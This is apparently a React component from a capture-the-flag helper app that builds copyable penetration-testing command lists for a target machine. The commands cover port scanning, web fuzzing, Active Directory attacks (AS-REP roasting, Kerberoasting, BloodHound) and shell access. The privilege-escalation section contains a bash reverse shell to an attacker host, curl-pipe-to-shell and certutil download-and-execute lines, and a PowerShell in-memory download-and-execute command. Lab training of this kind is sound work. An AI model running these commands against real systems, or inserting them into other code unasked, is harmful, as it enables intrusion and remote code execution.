import React, { useState, useMemo } from 'react';
import { 
  Terminal, 
  Copy, 
  Check, 
  Search, 
  Globe, 
  Cpu, 
  Layers, 
  ArrowRight, 
  Flame, 
  Server, 
  ShieldCheck,
  Zap
} from 'lucide-react';
import { Machine } from '../../types';
import { useCtfStore } from '../../store/useCtfStore';
import { playCyberSound, safeCopyToClipboard } from '../../utils/helpers';

interface QuickCommandsTabProps {
  machine: Machine;
}

interface CommandItem {
  id: string;
  category: 'recon' | 'web' | 'ad' | 'services' | 'privesc';
  title: string;
  description: string;
  command: string;
  relevance: string;
}

export const QuickCommandsTab: React.FC<QuickCommandsTabProps> = ({ machine }) => {
  const globalVars = useCtfStore((s) => s.globalVars);
  const soundEnabled = useCtfStore((s) => s.soundEnabled);
  const [activeCategory, setActiveCategory] = useState<string>('all');
  const [searchQuery, setSearchQuery] = useState('');
  const [copiedId, setCopiedId] = useState<string | null>(null);

  // Determine active IP (priority: real machine IP -> global targetIp -> fallback)
  const targetIp = useMemo(() => {
    if (machine.ip && machine.ip !== '10.10.x.x' && !machine.ip.includes('x.x')) {
      return machine.ip;
    }
    if (globalVars.targetIp && globalVars.targetIp !== '10.10.10.X' && !globalVars.targetIp.includes('X')) {
      return globalVars.targetIp;
    }
    return machine.ip || '10.10.10.x';
  }, [machine.ip, globalVars.targetIp]);

  const lhost = globalVars.lhost || '10.10.14.x';
  const lport = globalVars.lport || '4444';
  const domain = globalVars.customVars?.DOMAIN || 'corp.local';
  const user = globalVars.customVars?.USER || 'administrator';
  const password = globalVars.customVars?.PASSWORD || 'Password123!';

  // Generate target-aware command matrix
  const commands: CommandItem[] = useMemo(() => {
    const list: CommandItem[] = [];
    const openPorts = machine.openPorts || [];
    const hasPort = (p: number) => openPorts.includes(p);
    const hasTag = (t: string) => machine.tags.some(tag => tag.toLowerCase().includes(t.toLowerCase()));

    const isAD = hasTag('ad') || hasTag('kerberos') || hasTag('activedirectory') || hasPort(88) || hasPort(389);
    const isWeb = hasTag('web') || hasPort(80) || hasPort(443) || hasPort(8080) || hasPort(8443) || hasTag('http');
    const isWindows = machine.os === 'Windows' || isAD;
    const isLinux = machine.os === 'Linux';

    // 1. RECON & PORT DISCOVERY
    list.push({
      id: 'recon-nmap-fast',
      category: 'recon',
      title: 'Fast TCP SYN Scan (All Ports)',
      description: 'Ultra-fast port discovery scan across all 65,535 TCP ports with 1,000 packet rate.',
      command: `nmap -p- --min-rate=1000 -sS -Pn -oN nmap/${machine.name.toLowerCase()}_allports.nmap ${targetIp}`,
      relevance: 'Standard Initial Reconnaissance',
    });

    list.push({
      id: 'recon-nmap-services',
      category: 'recon',
      title: 'Targeted Service & Script Scan',
      description: 'Executes default scripts and version detection on discovered ports.',
      command: openPorts.length > 0 
        ? `nmap -sC -sV -p${openPorts.join(',')} -Pn -oN nmap/${machine.name.toLowerCase()}_services.nmap ${targetIp}`
        : `nmap -sC -sV -p21,22,53,80,88,139,389,443,445,1433,3306,3389,8080 -Pn -oN nmap/${machine.name.toLowerCase()}_services.nmap ${targetIp}`,
      relevance: openPorts.length > 0 ? `Targeting ${openPorts.length} known open ports` : 'Common ports fallback',
    });

    list.push({
      id: 'recon-rustscan',
      category: 'recon',
      title: 'Rustscan Rapid Discovery',
      description: 'Adaptive ultra-fast Rustscan piping directly into Nmap service enumeration.',
      command: `rustscan -a ${targetIp} --ulimit 5000 -- -sC -sV -Pn`,
      relevance: 'High-speed discovery engine',
    });

    list.push({
      id: 'recon-udp',
      category: 'recon',
      title: 'Top 20 UDP Discovery Scan',
      description: 'Quick sweep of common UDP services (SNMP, DNS, NTP, TFTP).',
      command: `nmap -sU --top-ports 20 -Pn ${targetIp}`,
      relevance: 'UDP Surface Audit',
    });

    // 2. WEB EXPLOITATION
    if (isWeb || openPorts.length === 0) {
      list.push({
        id: 'web-ffuf',
        category: 'web',
        title: 'FFUF Directory & Endpoint Fuzzing',
        description: 'Fast web content discovery filtering out noise (200, 301, 302, 401, 403).',
        command: `ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -u http://${targetIp}/FUZZ -mc 200,204,301,302,307,401,403`,
        relevance: 'Web attack surface expansion',
      });

      list.push({
        id: 'web-gobuster',
        category: 'web',
        title: 'Gobuster with File Extensions',
        description: 'Searches for common executable scripts and config files.',
        command: `gobuster dir -u http://${targetIp} -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,json,bak,old`,
        relevance: 'Script and backup discovery',
      });

      list.push({
        id: 'web-whatweb',
        category: 'web',
        title: 'WhatWeb Technology Fingerprinting',
        description: 'Extracts web server versions, CMS headers, frameworks, and cookies.',
        command: `whatweb -a 3 http://${targetIp}`,
        relevance: 'Component fingerprinting',
      });

      list.push({
        id: 'web-nikto',
        category: 'web',
        title: 'Nikto Web Vulnerability Scan',
        description: 'Scans for dangerous files, outdated server programs, and known misconfigurations.',
        command: `nikto -h http://${targetIp}`,
        relevance: 'Server header & config audit',
      });
    }

    // 3. ACTIVE DIRECTORY & SMB
    if (isAD || isWindows || hasPort(445) || hasPort(139) || openPorts.length === 0) {
      list.push({
        id: 'ad-nxc-shares',
        category: 'ad',
        title: 'NetExec SMB Null / Guest Share Enum',
        description: 'Checks SMB signing, OS version, and enumerates readable shares without creds.',
        command: `nxc smb ${targetIp} -u '' -p '' --shares`,
        relevance: 'Unauthenticated SMB Recon',
      });

      list.push({
        id: 'ad-smbclient',
        category: 'ad',
        title: 'SMBClient Anonymous Listing',
        description: 'Direct interactive listing of SMB shares with anonymous bind.',
        command: `smbclient -N -L //${targetIp}`,
        relevance: 'SMB share exploration',
      });

      list.push({
        id: 'ad-kerbrute',
        category: 'ad',
        title: 'Kerbrute User Enumeration',
        description: 'Stealthily enumerates valid domain usernames via Kerberos pre-authentication.',
        command: `kerbrute userenum -d ${domain} --dc ${targetIp} /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt`,
        relevance: isAD ? 'Valid Domain Account Discovery' : 'Active Directory Recon',
      });

      list.push({
        id: 'ad-asreproast',
        category: 'ad',
        title: 'Impacket AS-REP Roasting (No Pre-Auth)',
        description: 'Requests TGTs for accounts with DONT_REQ_PREAUTH set for offline hash cracking.',
        command: `impacket-GetNPUsers ${domain}/ -dc-ip ${targetIp} -no-pass -usersfile users.txt -format hashcat`,
        relevance: 'Offline Hash Extraction',
      });

      list.push({
        id: 'ad-kerberoast',
        category: 'ad',
        title: 'Impacket Kerberoasting',
        description: 'Requests TGS tickets for Service Principal Names (SPNs) using domain user creds.',
        command: `impacket-GetUserSPNs ${domain}/${user}:${password} -dc-ip ${targetIp} -request`,
        relevance: 'SPN Ticket Cracking',
      });

      list.push({
        id: 'ad-bloodhound',
        category: 'ad',
        title: 'BloodHound Python Ingestion',
        description: 'Dumps complete domain attack graph topology across LDAP, SMB, and RPC.',
        command: `bloodhound-python -u '${user}' -p '${password}' -d ${domain} -ns ${targetIp} -c All --zip`,
        relevance: 'Domain Relationship Mapping',
      });
    }

    // 4. SERVICE SPECIFIC (FTP, SSH, SNMP, Redis, MySQL)
    if (hasPort(21) || hasTag('ftp') || openPorts.length === 0) {
      list.push({
        id: 'svc-ftp',
        category: 'services',
        title: 'FTP Anonymous Login Check',
        description: 'Attempts anonymous connection and downloads accessible files.',
        command: `ftp -a ${targetIp}`,
        relevance: 'Port 21 Anonymous Check',
      });
    }

    if (hasPort(22) || hasTag('ssh') || openPorts.length === 0) {
      list.push({
        id: 'svc-ssh',
        category: 'services',
        title: 'SSH Direct Connection',
        description: 'Direct SSH connection disabling strict host checking.',
        command: `ssh -o StrictHostKeyChecking=no user@${targetIp}`,
        relevance: 'Port 22 Shell Access',
      });
    }

    if (hasPort(161) || hasTag('snmp')) {
      list.push({
        id: 'svc-snmp',
        category: 'services',
        title: 'SNMP Walk Public Community String',
        description: 'Enumerates system info, network interfaces, and running processes.',
        command: `snmpwalk -v2c -c public ${targetIp} 1.3.6.1.2.1.1`,
        relevance: 'Port 161 SNMP Enumeration',
      });
    }

    // 5. PRIVESC & FILE TRANSFER
    list.push({
      id: 'priv-http-server',
      category: 'privesc',
      title: 'Python3 Staging HTTP Server',
      description: 'Hosts local tools and scripts from your attack machine.',
      command: `python3 -m http.server 80`,
      relevance: 'Tool Staging on Attack Rig',
    });

    if (isLinux || !isWindows) {
      list.push({
        id: 'priv-linpeas',
        category: 'privesc',
        title: 'LinPEAS In-Memory Execution',
        description: 'Downloads and executes LinPEAS directly in RAM without touching disk.',
        command: `curl -L http://${lhost}/linpeas.sh | sh`,
        relevance: 'Linux Automated PrivEsc Enum',
      });

      list.push({
        id: 'priv-revshell-bash',
        category: 'privesc',
        title: 'Tactical Bash Reverse Shell',
        description: 'Classic interactive Bash socket connection back to your netcat listener.',
        command: `bash -c 'bash -i >& /dev/tcp/${lhost}/${lport} 0>&1'`,
        relevance: 'Interactive Reverse Shell',
      });
    }

    if (isWindows || isAD) {
      list.push({
        id: 'priv-winpeas',
        category: 'privesc',
        title: 'Windows Certutil Binary Ingress',
        description: 'Downloads winPEAS binary to target using built-in Windows utility.',
        command: `certutil -urlcache -split -f http://${lhost}/winPEASany.exe winpeas.exe && winpeas.exe`,
        relevance: 'Windows Automated PrivEsc Enum',
      });

      list.push({
        id: 'priv-powershell-iex',
        category: 'privesc',
        title: 'PowerShell In-Memory Download & Execute',
        description: 'Executes PowerUp or exploit scripts purely in RAM.',
        command: `powershell -nop -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://${lhost}/PowerUp.ps1'); Invoke-AllChecks"`,
        relevance: 'Fileless Windows Enum',
      });
    }

    return list;
  }, [machine, targetIp, lhost, lport, domain, user, password]);

  // Filter commands by active category and search
  const filteredCommands = useMemo(() => {
    return commands.filter((c) => {
      if (activeCategory !== 'all' && c.category !== activeCategory) return false;
      if (searchQuery.trim()) {
        const q = searchQuery.toLowerCase();
        return (
          c.title.toLowerCase().includes(q) ||
          c.description.toLowerCase().includes(q) ||
          c.command.toLowerCase().includes(q) ||
          c.relevance.toLowerCase().includes(q)
        );
      }
      return true;
    });
  }, [commands, activeCategory, searchQuery]);

  const handleCopyCommand = async (cmd: CommandItem) => {
    await safeCopyToClipboard(cmd.command);
    setCopiedId(cmd.id);
    if (soundEnabled) playCyberSound('copy');
    setTimeout(() => setCopiedId(null), 2000);
  };

  const categories = [
    { id: 'all', label: 'All Commands', count: commands.length },
    { id: 'recon', label: 'Recon & Nmap', count: commands.filter(c => c.category === 'recon').length },
    { id: 'web', label: 'Web Exploitation', count: commands.filter(c => c.category === 'web').length },
    { id: 'ad', label: 'Active Directory / SMB', count: commands.filter(c => c.category === 'ad').length },
    { id: 'services', label: 'Services', count: commands.filter(c => c.category === 'services').length },
    { id: 'privesc', label: 'PrivEsc & Shells', count: commands.filter(c => c.category === 'privesc').length },
  ];

  return (
    <div className="space-y-4 font-mono text-xs">
      {/* Top Banner: Target Telemetry & Injected Variables */}
      <div className="p-3 rounded-xl bg-[#090e1c] border border-cyber-border flex flex-wrap items-center justify-between gap-3 text-xs shadow-sm">
        <div className="flex items-center gap-2">
          <span className="w-2 h-2 rounded-full bg-cyber-emerald animate-pulse shadow-glow-emerald" />
          <span className="text-cyber-muted font-bold">TARGET:</span>
          <strong className="text-white">{machine.name}</strong>
          <span className="text-cyber-border">|</span>
          <span className="text-cyber-muted font-bold">INJECTED IP:</span>
          <code className="px-1.5 py-0.5 rounded bg-cyber-card border border-cyber-emerald/40 text-cyber-emerald font-bold">
            {targetIp}
          </code>
        </div>

        <div className="flex items-center gap-2 text-[11px]">
          <span className="text-cyber-muted font-bold">LHOST:</span>
          <code className="text-cyber-cyan font-bold">{lhost}</code>
          <span className="text-cyber-muted font-bold">LPORT:</span>
          <code className="text-cyber-cyan font-bold">{lport}</code>
        </div>
      </div>

      {/* Category Pills & Search */}
      <div className="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-2.5">
        <div className="flex items-center gap-1.5 overflow-x-auto pb-1 max-w-full">
          {categories.map((cat) => (
            <button
              key={cat.id}
              onClick={() => {
                setActiveCategory(cat.id);
                if (soundEnabled) playCyberSound('click');
              }}
              className={`px-2.5 py-1 rounded-lg text-xs font-semibold whitespace-nowrap transition-all border ${
                activeCategory === cat.id
                  ? 'bg-cyber-cyan/20 border-cyber-cyan text-cyber-cyan shadow-glow-cyan/20 font-bold'
                  : 'bg-cyber-bg border-cyber-border text-cyber-muted hover:text-white'
              }`}
            >
              <span>{cat.label}</span>
              <span className="text-[10px] ml-1 opacity-70">({cat.count})</span>
            </button>
          ))}
        </div>

        <div className="relative w-full sm:w-56">
          <Search className="w-3.5 h-3.5 absolute left-2.5 top-2 text-cyber-muted" />
          <input
            id="quick-commands-search-input"
            name="quick-commands-search"
            aria-label="Search quick commands"
            type="text"
            value={searchQuery}
            onChange={(e) => setSearchQuery(e.target.value)}
            placeholder="Search commands..."
            className="w-full pl-8 pr-3 py-1.5 rounded-lg bg-cyber-bg border border-cyber-border text-xs text-white placeholder-cyber-muted focus:outline-none focus:border-cyber-cyan"
          />
        </div>
      </div>

      {/* Commands List */}
      <div className="space-y-2.5 max-h-[500px] overflow-y-auto pr-1 scrollbar-thin">
        {filteredCommands.length === 0 ? (
          <div className="p-8 text-center text-cyber-muted rounded-xl bg-cyber-bg border border-cyber-border">
            No commands found matching criteria.
          </div>
        ) : (
          filteredCommands.map((cmd) => {
            const isCopied = copiedId === cmd.id;
            return (
              <div 
                key={cmd.id}
                className="p-3 rounded-xl bg-cyber-card/80 border border-cyber-border hover:border-cyber-cyan/50 transition-all space-y-2 group"
              >
                <div className="flex items-center justify-between gap-2">
                  <div className="flex items-center gap-2">
                    <span className="text-white font-bold text-xs">{cmd.title}</span>
                    <span className="px-1.5 py-0.2 rounded text-[9px] bg-cyber-bg text-cyber-cyan border border-cyber-border font-mono">
                      {cmd.relevance}
                    </span>
                  </div>

                  <button
                    onClick={() => handleCopyCommand(cmd)}
                    className={`flex items-center gap-1 px-2.5 py-1 rounded-md text-xs font-bold transition-all ${
                      isCopied
                        ? 'bg-cyber-emerald text-black shadow-glow-emerald'
                        : 'bg-cyber-bg hover:bg-cyber-cyan hover:text-black text-cyber-muted hover:text-white border border-cyber-border'
                    }`}
                    title="1-Click Copy Command to Clipboard"
                  >
                    {isCopied ? (
                      <>
                        <Check className="w-3 h-3 stroke-[3]" />
                        <span>COPIED!</span>
                      </>
                    ) : (
                      <>
                        <Copy className="w-3 h-3" />
                        <span>COPY</span>
                      </>
                    )}
                  </button>
                </div>

                <p className="text-[11px] text-cyber-muted leading-relaxed">
                  {cmd.description}
                </p>

                <div className="relative">
                  <pre className="p-2.5 rounded-lg bg-black/60 border border-cyber-border/80 text-[11px] font-mono text-cyber-emerald overflow-x-auto select-all scrollbar-thin">
                    <code>{cmd.command}</code>
                  </pre>
                </div>
              </div>
            );
          })
        )}
      </div>
    </div>
  );
};
